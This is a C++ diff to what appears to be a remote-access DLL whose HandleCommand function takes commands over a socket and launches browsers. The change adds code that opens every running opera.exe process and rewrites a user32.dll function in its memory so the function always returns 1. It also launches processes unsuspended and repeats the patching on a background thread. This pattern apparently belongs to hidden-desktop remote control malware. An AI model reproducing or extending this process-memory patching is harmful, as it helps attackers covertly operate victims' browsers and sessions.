@@ -597,7 +597,10 @@ static void kill_process_by_name(const wstring& exeName) {
     CloseHandle(hSnap);
 }
 
-static bool patch_cursor_info(HANDLE hProc) {
+static bool patch_cursor_info_by_pid(DWORD pid) {
+    HANDLE hProc = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProc) return false;
+
     void* addr = nullptr;
     HMODULE hLocalUser32 = GetModuleHandleW(L"user32.dll");
     if (hLocalUser32) {
@@ -605,7 +608,7 @@ static bool patch_cursor_info(HANDLE hProc) {
         if (localProc) {
             DWORD_PTR offset = (DWORD_PTR)localProc - (DWORD_PTR)hLocalUser32;
 
-            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(hProc));
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
             if (hSnap != INVALID_HANDLE_VALUE) {
                 MODULEENTRY32W me32{};
                 me32.dwSize = sizeof(me32);
@@ -624,7 +627,10 @@ static bool patch_cursor_info(HANDLE hProc) {
             }
         }
     }
-    if (!addr) return false;
+    if (!addr) {
+        CloseHandle(hProc);
+        return false;
+    }
 
     bool is64 = true;
     BOOL isWow64 = FALSE;
@@ -645,14 +651,49 @@ static bool patch_cursor_info(HANDLE hProc) {
         patch = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC2, 0x04, 0x00 };
     }
 
+    // Check if already patched
+    vector<unsigned char> currentBytes(patch.size());
+    SIZE_T readBytes = 0;
+    if (ReadProcessMemory(hProc, addr, currentBytes.data(), patch.size(), &readBytes) && readBytes == patch.size()) {
+        if (currentBytes == patch) {
+            CloseHandle(hProc);
+            return true;
+        }
+    }
+
     DWORD oldProt;
     if (!VirtualProtectEx(hProc, addr, patch.size(), PAGE_EXECUTE_READWRITE, &oldProt)) {
+        CloseHandle(hProc);
         return false;
     }
     SIZE_T written = 0;
     bool ok = WriteProcessMemory(hProc, addr, patch.data(), patch.size(), &written);
     VirtualProtectEx(hProc, addr, patch.size(), oldProt, &oldProt);
+    CloseHandle(hProc);
     return ok && written == patch.size();
+}
+
+static void patch_all_opera_processes_async() {
+    thread([]() {
+        for (int i = 0; i < 40; ++i) {
+            this_thread::sleep_for(chrono::milliseconds(500));
+
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap == INVALID_HANDLE_VALUE) continue;
+
+            PROCESSENTRY32W pe32{};
+            pe32.dwSize = sizeof(pe32);
+
+            if (Process32FirstW(hSnap, &pe32)) {
+                do {
+                    if (_wcsicmp(pe32.szExeFile, L"opera.exe") == 0) {
+                        patch_cursor_info_by_pid(pe32.th32ProcessID);
+                    }
+                } while (Process32NextW(hSnap, &pe32));
+            }
+            CloseHandle(hSnap);
+        }
+    }).detach();
 }
 
 // -----------------------------------------------------------------------
@@ -2111,11 +2152,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     }
 
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+                                       0, NULL, NULL, &si, &pi)) {
                         if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
-                            patch_cursor_info(pi.hProcess);
+                            patch_all_opera_processes_async();
                         }
-                        ResumeThread(pi.hThread);
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
